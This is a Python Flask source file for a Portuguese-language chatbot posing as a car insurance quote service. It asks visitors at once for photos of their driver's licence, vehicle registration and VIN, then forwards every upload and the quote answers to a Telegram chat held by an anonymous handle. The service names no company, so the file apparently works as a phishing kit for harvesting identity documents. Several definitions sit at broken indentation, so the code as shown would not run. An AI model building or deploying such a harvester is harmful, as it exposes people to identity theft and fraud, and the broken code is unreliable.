# Car Insurance Lead Bot - With Document Upload
# Environment variables: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

from flask import Flask, render_template_string, request, jsonify
import requests
import os
import random
import base64
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configuration from environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '@Toustten')

# Allowed file types and max size
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

# Knowledge base with formal/professional tone
KNOWLEDGE_BASE = {
    "greetings": ["oi", "olá", "ola", "e aí", "e ai", "tudo bem", "bom dia", "boa tarde", "boa noite", "hey", "hi", "hello"],
    
    "opening_messages": [
        "Olá, tudo bem? Para que a gente possa estar providenciando a sua cotação, eu preciso que me envie a foto do documento do seu veículo."
    ],

    "immediate_document_request": True,
    
    "acknowledgments": ["Perfeito.", "Entendido.", "Muito bem.", "Excelente.", "Perfeitamente."],
    
    "insurance_types": {
        "responsabilidade": "A Responsabilidade Civil é a cobertura obrigatória no Brasil. Ela protege o senhor contra danos materiais e corporais causados a terceiros em caso de acidente.",
        "civil": "A Responsabilidade Civil é a cobertura obrigatória no Brasil. Ela protege o senhor contra danos materiais e corporais causados a terceiros.",
        "rc": "A Responsabilidade Civil é a cobertura obrigatória no Brasil. Ela protege o senhor contra danos materiais e corporais causados a terceiros.",
        "colisão": "A cobertura de Colisão protege o veículo do senhor contra danos próprios em caso de acidente, independentemente de quem tenha causado.",
        "colisao": "A cobertura de Colisão protege o veículo do senhor contra danos próprios em caso de acidente, independentemente de quem tenha causado.",
        "ambos": "Temos ambas as opções disponíveis: Responsabilidade Civil, que é obrigatória e cobre danos a terceiros, e Colisão, que protege o veículo do senhor. Posso explicar melhor sobre alguma delas?",
        "os dois": "Temos ambas as opções disponíveis: Responsabilidade Civil, que é obrigatória e cobre danos a terceiros, e Colisão, que protege o veículo do senhor."
    },
    
    "vehicle_acknowledgments": {
        "civic": "O Honda Civic é um excelente veículo. Muito bem conservado, geralmente.",
        "corolla": "O Toyota Corolla é um veículo de ótima confiabilidade. Excelente escolha.",
        "gol": "O Volkswagen Gol é um carro popular e bastante resistente.",
        "onix": "O Chevrolet Onix é um dos veículos mais vendidos do Brasil. Ótima opção.",
        "default": "Muito bem. Prosseguiremos com as informações."
    },
    
    "requirements": "Para a elaboração da apólice, necessitamos apenas da Carteira Nacional de Habilitação (CNH) válida e do documento do veículo (CRLV). O processo é bastante ágil.",
    
    "claims": "Em caso de sinistro, o senhor deve entrar em contato através do número 0800 090 090. O atendimento funciona 24 horas por dia, todos os dias da semana.",
    
    "coverage_area": "Atuamos em todo o território nacional. O senhor terá cobertura completa em qualquer localidade do Brasil.",
    
    "quote_intro": "Com prazer. Farei algumas perguntas para elaborarmos uma cotação personalizada e adequada às suas necessidades.",
    
    "quote_questions": {
        "vehicle": "Qual é o veículo? Por favor, informe marca, modelo e ano.",
        "coverage": "Qual cobertura o senhor prefere?\n• Responsabilidade Civil (cobre danos a terceiros)\n• Colisão (cobre o seu veículo)\n• Ambas as coberturas",
        "location": "Em qual cidade e estado o veículo se encontra?",
        "driver_age": "Qual é a idade do motorista principal?"
    },
    
    "document_request": "Para prosseguirmos com a cotação, poderia enviar os seguintes documentos?\n\n1. CNH (frente e verso)\n2. CRLV do veículo\n3. Foto do número VIN/chassi (opcional, mas ajuda na precisão)\n\nClique no botão de anexo 📎 abaixo para enviar.",
    
    "document_received": "Documento recebido com sucesso. Obrigado!",
    
    "closing": "Perfeito. Encaminhei todas as informações e documentos para nosso consultor, que entrará em contato em breve com a cotação personalizada. Fico no aguardo caso tenha mais alguma dúvida. À disposição!",
    
    "fallback_responses": [
        "Peço desculpas, não compreendi perfeitamente. Posso auxiliá-lo com informações sobre coberturas, documentos necessários ou iniciar uma cotação. O que seria mais conveniente?",
        "Perdão, não entendi. Trabalhamos com seguros de Responsabilidade Civil e Colisão para todo o território brasileiro. Como posso ser útil?"
    ]
}
# Conversation state (simple in-memory, resets on restart)
conversations = {}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_acknowledgment():
    """Get a random formal acknowledgment"""
    return random.choice(KNOWLEDGE_BASE["acknowledgments"])

def get_vehicle_acknowledgment(vehicle_text):
    """Get acknowledgment based on vehicle mentioned"""
    vehicle_lower = vehicle_text.lower()
    for key, response in KNOWLEDGE_BASE["vehicle_acknowledgments"].items():
        if key in vehicle_lower:
            return response
    return KNOWLEDGE_BASE["vehicle_acknowledgments"]["default"]

def send_telegram_alert(title, details):
    """Send text alert to Telegram"""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == '':
        print(f"[TELEGRAM NOT CONFIGURED] Would send: {title}")
        return False
    
    text = f"🚨 <b>{title}</b>\n\n{details}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        print(f"Telegram alert sent: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"Failed to send Telegram alert: {e}")
        return False

def send_telegram_photo(photo_data, caption, filename):
    """Send photo to Telegram"""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == '':
        print(f"[TELEGRAM NOT CONFIGURED] Would send photo: {caption}")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    
    try:
        files = {'photo': (filename, photo_data, 'image/jpeg')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        print(f"Telegram photo sent: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"Failed to send Telegram photo: {e}")
        return False

def send_telegram_document(doc_data, caption, filename):
    """Send document to Telegram"""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == '':
        print(f"[TELEGRAM NOT CONFIGURED] Would send document: {caption}")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    
    try:
        files = {'document': (filename, doc_data, 'application/pdf')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        print(f"Telegram document sent: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"Failed to send Telegram document: {e}")
        return False

def send_quote_summary(session_id):
    """Send complete quote info to Telegram"""
    conv = conversations.get(session_id, {})
    quote_data = conv.get('quote_data', {})
    documents = conv.get('documents', {})
    
    details = f"""
<b>🚗 NOVA COTAÇÃO DE SEGURO</b>

<b>Veículo:</b> {quote_data.get('vehicle', 'Não informado')}
<b>Cobertura:</b> {quote_data.get('coverage', 'Não informado')}
<b>Localização:</b> {quote_data.get('location', 'Não informado')}
<b>Idade do motorista:</b> {quote_data.get('driver_age', 'Não informado')}

<b>Documentos recebidos:</b>
• CNH: {'✅' if documents.get('cnh') else '❌'}
• CRLV: {'✅' if documents.get('crlv') else '❌'}
• VIN: {'✅' if documents.get('vin') else '❌'}

<b>Status:</b> Aguardando cotação ⏳"""
    
    send_telegram_alert("Nova cotação solicitada!", details)
    def get_bot_response(user_message, session_id):
    """Generate bot response based on user input"""
    msg_lower = user_message.lower().strip()
    
    # Initialize conversation if new
    if session_id not in conversations:
        conversations[session_id] = {
            "step": "greeting", 
            "unknown_count": 0,
            "quote_data": {},
            "documents": {},
            "awaiting_documents": False
        }
    
    conv = conversations[session_id]
    
    # Handle quote flow
    if conv.get("in_quote_flow"):
        quote_step = conv.get("quote_step", 0)
        quote_questions = ["vehicle", "coverage", "location", "driver_age"]
        
        # Save previous answer
        if quote_step > 0 and quote_step <= len(quote_questions):
            prev_question = quote_questions[quote_step - 1]
            conv["quote_data"][prev_question] = user_message
            
            # Special acknowledgment for vehicle
            if prev_question == "vehicle":
                ack = get_vehicle_acknowledgment(user_message)
                if quote_step < len(quote_questions):
                    next_question = quote_questions[quote_step]
                    conv["quote_step"] = quote_step + 1
                    return f"{ack}\n\n{KNOWLEDGE_BASE['quote_questions'][next_question]}"
        
        # Ask next question or finish questions
        if quote_step < len(quote_questions):
            next_question = quote_questions[quote_step]
            conv["quote_step"] = quote_step + 1
            return KNOWLEDGE_BASE["quote_questions"][next_question]
        else:
            # All questions answered, now request documents
            conv["awaiting_documents"] = True
            conv["in_quote_flow"] = False
            return KNOWLEDGE_BASE["document_request"]
    
   # Check for greetings - immediately request document
    if any(greet in msg_lower for greet in KNOWLEDGE_BASE["greetings"]) and conv["step"] == "greeting":
        conv["step"] = "awaiting_document"
        conv["awaiting_documents"] = True
        conv["documents"] = {}
        return KNOWLEDGE_BASE["opening_messages"][0] + "\n\nClique no botão de anexo 📎 abaixo para enviar."
    
    # Check for quote request
    if any(word in msg_lower for word in ["preço", "preco", "valor", "cotação", "cotacao", "quanto custa", "quote", "orçamento", "orcamento", "quanto fica", "fazer seguro", "cotar", "sim", "pode ser", "quero", "interesse", "correto", "isso mesmo"]):
        conv["in_quote_flow"] = True
        conv["quote_step"] = 0
        conv["quote_data"] = {}
        conv["documents"] = {}
        conv["awaiting_documents"] = False
        return get_acknowledgment() + " " + KNOWLEDGE_BASE["quote_intro"] + "\n\n" + KNOWLEDGE_BASE["quote_questions"]["vehicle"]
    
    # Check for insurance types
    for key, response in KNOWLEDGE_BASE["insurance_types"].items():
        if key in msg_lower:
            conv["step"] = "details"
            return response + "\n\nPosso iniciar uma cotação para o senhor?"
    
    # Check for requirements
    if any(word in msg_lower for word in ["documento", "documentos", "precisa", "cnh", "requerimento", "requirements", "preciso de", "necessário"]):
        return KNOWLEDGE_BASE["requirements"] + "\n\nGostaria de prosseguir com uma cotação?"
    
    # Check for claims/sinister
    if any(word in msg_lower for word in ["sinistro", "acidente", "bateu", "bati", "roubaram", "furto", "claim", "0800", "bater", "colidiu"]):
        return KNOWLEDGE_BASE["claims"]
    
    # Check for coverage area
    if any(word in msg_lower for word in ["onde", "cidade", "estado", "brasil", "cobertura", "área", "area", "atende", "funciona", "localidade"]):
        return KNOWLEDGE_BASE["coverage_area"]
    
    # Check for no/exit responses
    if msg_lower in ["não", "nao", "no", "obrigado", "agradeço", "tchau", "até logo"]:
        return "Fico à disposição. Caso precise de mais informações, é só entrar em contato. Tenha um excelente dia!"
    
    # Unknown input — escalate after 2 failures
    conv["unknown_count"] += 1
    
    if conv["unknown_count"] >= 2:
        send_telegram_alert("Cliente não entendido", f"Mensagem: {user_message}")
        conv["unknown_count"] = 0
        return "Peço desculpas, estou com dificuldades para compreender. Vou encaminhar o senhor para um de nossos consultores, que poderá auxiliá-lo melhor. Um momento, por favor..."
    
    return KNOWLEDGE_BASE["fallback_responses"][conv["unknown_count"] - 1]
    # HTML template with file upload support
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguro Auto - Cotação</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .chat-container {
            width: 100%;
            max-width: 420px;
            height: 85vh;
            min-height: 500px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 25px 80px rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .chat-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 24px 20px;
            text-align: center;
        }
        .chat-header h1 { font-size: 1.3rem; font-weight: 600; }
        .chat-header p { font-size: 0.9rem; opacity: 0.9; margin-top: 6px; }
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }
        .message {
            max-width: 85%;
            padding: 14px 18px;
            border-radius: 20px;
            font-size: 0.95rem;
            line-height: 1.5;
            animation: fadeIn 0.3s ease;
            word-wrap: break-word;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.bot {
            background: #f0f2f5;
            color: #1a1a1a;
            align-self: flex-start;
            border-bottom-left-radius: 6px;
        }
        .message.user {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            align-self: flex-end;
            border-bottom-right-radius: 6px;
        }
        .message.file {
            background: #e8f4f8;
            color: #1a1a1a;
            align-self: flex-start;
            border-bottom-left-radius: 6px;
            border-left: 4px solid #667eea;
        }
        .chat-input {
            padding: 18px 20px;
            border-top: 1px solid #e8e8e8;
            display: flex;
            gap: 12px;
            background: #fafafa;
            align-items: center;
        }
        .chat-input input[type="text"] {
            flex: 1;
            padding: 14px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 28px;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.3s;
            background: white;
        }
        .chat-input input[type="text"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .chat-input button {
            width: 50px;
            height: 50px;
            border: none;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .chat-input button:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
        }
        .file-btn {
            width: 50px;
            height: 50px;
            border: 2px solid #667eea;
            border-radius: 50%;
            background: white;
            color: #667eea;
            font-size: 1.4rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        .file-btn:hover {
            background: #667eea;
            color: white;
        }
        .file-input {
            display: none;
        }
        .typing {
            display: none;
            align-self: flex-start;
            background: #f0f2f5;
            padding: 16px 20px;
            border-radius: 20px;
            border-bottom-left-radius: 6px;
            margin-left: 20px;
            margin-bottom: 10px;
        }
        .typing span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #999;
            border-radius: 50%;
            margin: 0 3px;
            animation: typing 1.4s infinite;
        }
        .typing span:nth-child(2) { animation-delay: 0.2s; }
        .typing span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); }
            30% { transform: translateY(-10px); }
        }
        .footer {
            text-align: center;
            padding: 10px;
            font-size: 0.75rem;
            color: #999;
            background: #fafafa;
        }
        .upload-progress {
            display: none;
            padding: 10px 20px;
            background: #f0f2f5;
            text-align: center;
            font-size: 0.9rem;
            color: #667eea;
        }
        @media (max-width: 480px) {
            body { padding: 0; }
            .chat-container {
                height: 100vh;
                max-width: 100%;
                border-radius: 0;
            }
        }
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="chat-header">
            <h1>🚗 Seguro Auto</h1>
            <p>Cotação personalizada | Atendimento 24h</p>
        </div>
        <div class="chat-messages" id="messages">
            <div class="message bot">Olá, tudo bem? Para que a gente possa estar providenciando a sua cotação, eu preciso que me envie a foto do documento do seu veículo.<br><br>Clique no botão de anexo 📎 abaixo para enviar.
            </div>
        <div class="typing" id="typing">
            <span></span><span></span><span></span>
        </div>
        <div class="upload-progress" id="uploadProgress">Enviando documento...</div>
        <div class="chat-input">
            <input type="file" id="fileInput" class="file-input" accept="image/*,.pdf">
            <button class="file-btn" onclick="document.getElementById('fileInput').click()" title="Enviar documento">📎</button>
            <input type="text" id="userInput" placeholder="Digite sua mensagem..." autocomplete="off">
            <button onclick="sendMessage()">➤</button>
        </div>
        <div class="footer">Atendimento seguro e profissional 🔒</div>
    </div>

    <script>
        const messagesDiv = document.getElementById('messages');
        const userInput = document.getElementById('userInput');
        const typingDiv = document.getElementById('typing');
        const fileInput = document.getElementById('fileInput');
        const uploadProgress = document.getElementById('uploadProgress');
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

        function addMessage(text, isUser, isFile = false) {
            const div = document.createElement('div');
            div.className = 'message ' + (isUser ? 'user' : isFile ? 'file' : 'bot');
            div.innerHTML = text.replace(/\n/g, '<br>');
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        function showTyping() {
            typingDiv.style.display = 'block';
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        function hideTyping() {
            typingDiv.style.display = 'none';
        }

        function showUploadProgress() {
            uploadProgress.style.display = 'block';
        }

        function hideUploadProgress() {
            uploadProgress.style.display = 'none';
        }

        async function sendMessage() {
            const text = userInput.value.trim();
            if (!text) return;

            addMessage(text, true);
            userInput.value = '';
            showTyping();

            try {
                const response = await fetch('/chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: text, session_id: sessionId })
                });
                const data = await response.json();
                
                setTimeout(() => {
                    hideTyping();
                    addMessage(data.response, false);
                }, 600 + Math.random() * 400);
            } catch (error) {
                hideTyping();
                addMessage('Peço desculpas, ocorreu um problema. Por favor, tente novamente.', false);
            }
        }

        async function uploadFile(file) {
            if (!file) return;

            const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
            const maxSize = 10 * 1024 * 1024; // 10MB

            if (!allowedTypes.includes(file.type)) {
                addMessage('❌ Tipo de arquivo não suportado. Envie apenas JPG, PNG ou PDF.', false);
                return;
            }

            if (file.size > maxSize) {
                addMessage('❌ Arquivo muito grande. Tamanho máximo: 10MB.', false);
                return;
            }

            showUploadProgress();
            addMessage('📎 Enviando: ' + file.name, true, true);

            const formData = new FormData();
            formData.append('file', file);
            formData.append('session_id', sessionId);

            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                hideUploadProgress();
                addMessage(data.message, false);
            } catch (error) {
                hideUploadProgress();
                addMessage('❌ Erro ao enviar arquivo. Por favor, tente novamente.', false);
            }
        }

        fileInput.addEventListener('change', (e) => {
            const file = e.target.files[0];
            if (file) {
                uploadFile(file);
            }
            fileInput.value = '';
        });

        userInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });

        userInput.focus();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)
    @app.route('/chat', methods=['POST'])
def chat():
    data = request.json
    user_message = data.get('message', '')
    session_id = data.get('session_id', 'default')
    
    response = get_bot_response(user_message, session_id)
    
    return jsonify({"response": response})

@app.route('/upload', methods=['POST'])
def upload_file():
    """Handle file uploads and send to Telegram"""
    session_id = request.form.get('session_id', 'default')
    
    if session_id not in conversations:
        conversations[session_id] = {
            "step": "greeting", 
            "unknown_count": 0,
            "quote_data": {},
            "documents": {},
            "awaiting_documents": False
        }
    
    conv = conversations[session_id]
    
    if 'file' not in request.files:
        return jsonify({"message": "Nenhum arquivo enviado."})
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({"message": "Nenhum arquivo selecionado."})
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_ext = filename.rsplit('.', 1)[1].lower()
        file_data = file.read()
        
        # Determine document type from filename or content
        filename_lower = filename.lower()
        doc_type = "documento"
        doc_label = "Documento"
        
        if 'cnh' in filename_lower:
            doc_type = "cnh"
            doc_label = "CNH"
        elif 'crlv' in filename_lower or 'licenciamento' in filename_lower:
            doc_type = "crlv"
            doc_label = "CRLV"
        elif 'vin' in filename_lower or 'chassi' in filename_lower:
            doc_type = "vin"
            doc_label = "Foto do VIN/Chassi"
        
        # Mark document as received
        conv["documents"][doc_type] = True
        
        # Send to Telegram
        caption = f"📎 {doc_label} recebido\nSessão: {session_id[:20]}..."
        
        success = False
        if file_ext in ['jpg', 'jpeg', 'png']:
            success = send_telegram_photo(file_data, caption, filename)
        elif file_ext == 'pdf':
            success = send_telegram_document(file_data, caption, filename)
        
        if success:
            # Check if all documents received
            docs = conv.get("documents", {})
            if docs.get("cnh") and docs.get("crlv"):
                # All required docs received, send summary
                send_quote_summary(session_id)
                return jsonify({"message": f"{KNOWLEDGE_BASE['document_received']}\n\nTodos os documentos necessários foram recebidos. {KNOWLEDGE_BASE['closing']}"})
            else:
                missing = []
                if not docs.get("cnh"): missing.append("CNH")
                if not docs.get("crlv"): missing.append("CRLV")
                if not docs.get("vin"): missing.append("foto do VIN (opcional)")
                
                return jsonify({"message": f"{KNOWLEDGE_BASE['document_received']}\n\nDocumentos pendentes: {', '.join(missing)}. Pode enviar quando quiser!"})
        else:
            return jsonify({"message": "Documento recebido, mas houve um problema ao encaminhar. Nosso consultor será notificado."})
    
    return jsonify({"message": "Tipo de arquivo não permitido. Envie apenas JPG, PNG ou PDF."})

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
